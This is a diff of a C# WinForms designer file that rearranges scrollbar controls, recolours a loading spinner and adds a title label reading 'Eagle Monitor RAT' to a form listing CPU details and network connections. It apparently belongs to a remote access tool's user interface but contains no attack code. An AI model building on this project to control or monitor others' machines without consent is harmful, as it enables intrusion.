@@ -37,6 +37,7 @@
             this.maximizeButton = new Guna.UI2.WinForms.Guna2Button();
             this.minimizeButton = new Guna.UI2.WinForms.Guna2Button();
             this.guna2GroupBox1 = new Guna.UI2.WinForms.Guna2GroupBox();
+            this.guna2VScrollBar2 = new Guna.UI2.WinForms.Guna2VScrollBar();
             this.dataGridView1 = new System.Windows.Forms.DataGridView();
             this.Column1 = new System.Windows.Forms.DataGridViewTextBoxColumn();
             this.Column2 = new System.Windows.Forms.DataGridViewTextBoxColumn();
@@ -46,9 +47,9 @@
             this.label3 = new System.Windows.Forms.Label();
             this.label1 = new System.Windows.Forms.Label();
             this.label2 = new System.Windows.Forms.Label();
-            this.guna2VScrollBar2 = new Guna.UI2.WinForms.Guna2VScrollBar();
             this.loadingCircle1 = new MRG.Controls.UI.LoadingCircle();
             this.guna2GroupBox2 = new Guna.UI2.WinForms.Guna2GroupBox();
+            this.guna2VScrollBar1 = new Guna.UI2.WinForms.Guna2VScrollBar();
             this.dataGridView2 = new System.Windows.Forms.DataGridView();
             this.Column1TCP = new System.Windows.Forms.DataGridViewTextBoxColumn();
             this.Column2TCP = new System.Windows.Forms.DataGridViewTextBoxColumn();
@@ -60,7 +61,7 @@
             this.Column8 = new System.Windows.Forms.DataGridViewTextBoxColumn();
             this.panel3 = new System.Windows.Forms.Panel();
             this.panel4 = new System.Windows.Forms.Panel();
-            this.guna2VScrollBar1 = new Guna.UI2.WinForms.Guna2VScrollBar();
+            this.label5 = new System.Windows.Forms.Label();
             this.guna2GroupBox1.SuspendLayout();
             ((System.ComponentModel.ISupportInitialize)(this.dataGridView1)).BeginInit();
             this.panel1.SuspendLayout();
@@ -142,6 +143,21 @@
             this.guna2GroupBox1.Size = new System.Drawing.Size(424, 338);
             this.guna2GroupBox1.TabIndex = 41;
             this.guna2GroupBox1.Text = "CPU";
+            // 
+            // guna2VScrollBar2
+            // 
+            this.guna2VScrollBar2.Dock = System.Windows.Forms.DockStyle.Right;
+            this.guna2VScrollBar2.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(45)))), ((int)(((byte)(45)))));
+            this.guna2VScrollBar2.HoverState.Parent = null;
+            this.guna2VScrollBar2.LargeChange = 10;
+            this.guna2VScrollBar2.Location = new System.Drawing.Point(403, 91);
+            this.guna2VScrollBar2.MouseWheelBarPartitions = 10;
+            this.guna2VScrollBar2.Name = "guna2VScrollBar2";
+            this.guna2VScrollBar2.PressedState.Parent = this.guna2VScrollBar2;
+            this.guna2VScrollBar2.ScrollbarSize = 18;
+            this.guna2VScrollBar2.Size = new System.Drawing.Size(18, 244);
+            this.guna2VScrollBar2.TabIndex = 44;
+            this.guna2VScrollBar2.ThumbColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(60)))), ((int)(((byte)(60)))));
             // 
             // dataGridView1
             // 
@@ -263,26 +279,11 @@
             this.label2.TabIndex = 1;
             this.label2.Text = "CPU Brand :";
             // 
-            // guna2VScrollBar2
-            // 
-            this.guna2VScrollBar2.Dock = System.Windows.Forms.DockStyle.Right;
-            this.guna2VScrollBar2.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(45)))), ((int)(((byte)(45)))));
-            this.guna2VScrollBar2.HoverState.Parent = null;
-            this.guna2VScrollBar2.LargeChange = 10;
-            this.guna2VScrollBar2.Location = new System.Drawing.Point(403, 91);
-            this.guna2VScrollBar2.MouseWheelBarPartitions = 10;
-            this.guna2VScrollBar2.Name = "guna2VScrollBar2";
-            this.guna2VScrollBar2.PressedState.Parent = this.guna2VScrollBar2;
-            this.guna2VScrollBar2.ScrollbarSize = 18;
-            this.guna2VScrollBar2.Size = new System.Drawing.Size(18, 244);
-            this.guna2VScrollBar2.TabIndex = 44;
-            this.guna2VScrollBar2.ThumbColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(60)))), ((int)(((byte)(60)))));
-            // 
             // loadingCircle1
             // 
             this.loadingCircle1.Active = true;
             this.loadingCircle1.BackColor = System.Drawing.Color.Transparent;
-            this.loadingCircle1.Color = System.Drawing.Color.White;
+            this.loadingCircle1.Color = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(45)))), ((int)(((byte)(45)))));
             this.loadingCircle1.InnerCircleRadius = 5;
             this.loadingCircle1.Location = new System.Drawing.Point(3, 0);
             this.loadingCircle1.Name = "loadingCircle1";
@@ -315,6 +316,21 @@
             this.guna2GroupBox2.Size = new System.Drawing.Size(752, 338);
             this.guna2GroupBox2.TabIndex = 44;
             this.guna2GroupBox2.Text = "Network Connections (IPV4):";
+            // 
+            // guna2VScrollBar1
+            // 
+            this.guna2VScrollBar1.Dock = System.Windows.Forms.DockStyle.Right;
+            this.guna2VScrollBar1.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(45)))), ((int)(((byte)(45)))));
+            this.guna2VScrollBar1.HoverState.Parent = null;
+            this.guna2VScrollBar1.LargeChange = 10;
+            this.guna2VScrollBar1.Location = new System.Drawing.Point(731, 58);
+            this.guna2VScrollBar1.MouseWheelBarPartitions = 10;
+            this.guna2VScrollBar1.Name = "guna2VScrollBar1";
+            this.guna2VScrollBar1.PressedState.Parent = this.guna2VScrollBar1;
+            this.guna2VScrollBar1.ScrollbarSize = 18;
+            this.guna2VScrollBar1.Size = new System.Drawing.Size(18, 277);
+            this.guna2VScrollBar1.TabIndex = 44;
+            this.guna2VScrollBar1.ThumbColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(60)))), ((int)(((byte)(60)))));
             // 
             // dataGridView2
             // 
@@ -433,20 +449,16 @@
             this.panel4.Size = new System.Drawing.Size(746, 5);
             this.panel4.TabIndex = 52;
             // 
-            // guna2VScrollBar1
+            // label5
             // 
-            this.guna2VScrollBar1.Dock = System.Windows.Forms.DockStyle.Right;
-            this.guna2VScrollBar1.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(45)))), ((int)(((byte)(45)))));
-            this.guna2VScrollBar1.HoverState.Parent = null;
-            this.guna2VScrollBar1.LargeChange = 10;
-            this.guna2VScrollBar1.Location = new System.Drawing.Point(731, 58);
-            this.guna2VScrollBar1.MouseWheelBarPartitions = 10;
-            this.guna2VScrollBar1.Name = "guna2VScrollBar1";
-            this.guna2VScrollBar1.PressedState.Parent = this.guna2VScrollBar1;
-            this.guna2VScrollBar1.ScrollbarSize = 18;
-            this.guna2VScrollBar1.Size = new System.Drawing.Size(18, 277);
-            this.guna2VScrollBar1.TabIndex = 44;
-            this.guna2VScrollBar1.ThumbColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(60)))), ((int)(((byte)(60)))));
+            this.label5.BackColor = System.Drawing.Color.Transparent;
+            this.label5.ForeColor = System.Drawing.Color.White;
+            this.label5.Location = new System.Drawing.Point(41, 0);
+            this.label5.Name = "label5";
+            this.label5.Size = new System.Drawing.Size(235, 32);
+            this.label5.TabIndex = 45;
+            this.label5.Text = "Eagle Monitor RAT";
+            this.label5.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
             // 
             // InformationForm
             // 
@@ -454,6 +466,7 @@
             this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
             this.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(45)))), ((int)(((byte)(45)))));
             this.ClientSize = new System.Drawing.Size(1194, 380);
+            this.Controls.Add(this.label5);
             this.Controls.Add(this.guna2GroupBox2);
             this.Controls.Add(this.loadingCircle1);
             this.Controls.Add(this.guna2GroupBox1);
@@ -509,5 +522,6 @@
         private System.Windows.Forms.DataGridViewTextBoxColumn Column8;
         public Guna.UI2.WinForms.Guna2VScrollBar guna2VScrollBar2;
         public Guna.UI2.WinForms.Guna2VScrollBar guna2VScrollBar1;
+        public System.Windows.Forms.Label label5;
     }
 }
